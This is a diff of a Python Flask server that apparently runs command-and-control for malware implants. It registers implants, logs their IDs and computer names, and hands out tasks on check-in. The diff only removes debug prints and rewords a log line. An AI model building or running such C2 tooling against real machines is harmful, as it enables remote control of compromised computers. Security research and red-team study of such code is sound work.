@@ -18,13 +18,9 @@ PASSWORD = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"
 def handle_register():
 
     ip = request.remote_addr
-    print(f"{ip}")
     reg_data = request.get_data()
-    print("2")
     register = RegisterImplant()
-    print("3")
     register.ParseFromString(reg_data)
-    print("4")
     print(f'[+] New Implant: from {request.remote_addr}')
     print(f'[+]    * ImplantID: {register.ImplantID}')
     print(f'[+]    * ComputerName: {register.ComputerName}')
@@ -45,11 +41,11 @@ def checkin():
     reg_data = request.get_data()
     ic = ImplantCheckin()
     ic.ParseFromString(reg_data)
-    print(f'[+] Implant [{ic.ImplantID}] checking in.')
+    print(f'[+] Implant [{ic.ImplantID}] is checking in.')
     print(f'[+] --> TaskResponse = [{ic.Resp}]')
 
     update_implant_last_seen(ic.ImplantID) 
-    print('ksaf;kjaskldfjlaskdjfl')
+    
     # Send TaskRequest back or "" (if failed to analyze or no remaining tasks)
     if analyze_TaskResponse(ic.Resp):
         return get_next_task(ic.ImplantID)
